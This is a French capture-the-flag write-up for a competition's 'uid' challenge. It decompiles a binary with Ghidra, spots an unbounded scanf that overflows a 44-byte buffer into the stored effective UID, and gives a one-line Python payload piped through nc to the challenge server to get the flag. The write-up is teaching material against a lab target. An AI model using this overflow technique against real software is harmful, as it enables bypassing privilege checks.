Info sur le fichiers#

Tout d’abord,nous pouvons exécuter la commande: file uid pour avoir + d’infos sur le fichier: C’est un exécutable,rien de très surprenant…

Reverse#

Ensuite,nous pouvons reverse le fichier grâce à ghidra:

Nous voyons que pour que le fichier flag.txt soit flag,il faut que le UID soit égal à 0. En se renseignant,j’apprends que le UID avec ses différentes valeurs nous indique les privilèges de l’utilisateur,ainsi un UID = 0 signifie que l’utilisateur est root (super Admin) sur la machine. nous pouvons essayer de lancer le fichier en local avec sudo pour être en tant que root:

Ca fonctionne !

Problème#

Nous ne pouvons pas être root sur le serveur distant,donc il faut trouver un autre moyen…

Solution#

Identification de la vuln#

D’après le code:

undefined8 main(void){  
	undefined auStack_38 [44];
	int iStack_c;
	iStack_c = geteuid();  
	printf("username: ");  
	fflush(stdout);  
	__isoc99_scanf(&DAT_0010200f,auStack_38);  
	if (iStack_c == 0) {
	    system("cat flag.txt");  
	}  else {    system("cat flop.txt");
	  }  
	return 0;}

La variable iStack_c = geteuid(); ce qui veut dire que si iStack_c = 0 alors getuid = 0.

Sauf que la variable auStack_38 a un nombre de caractère à respecter (44) mais pas de nombre limité, et juste après c’est la variable iStack_c quiest définie,donc en faisant un buffer overflow nous pouvons écrire sur la variable iStack_c et donc avoir un UID = 0

Exploit de la vuln#

Nous povons créer un script python permet de créer le payload (qui devra finir par un null byte) afin d’exploiter la vuln:

exploit = "A" * 44 + "\x00"print(exploit)

Puuis nous avons plus que à nous connecter au serveur distant en utilisant notre payload: python exploit.py| nc challenges.france-cybersecurity-challenge.fr 2100

Et le flag apparait !
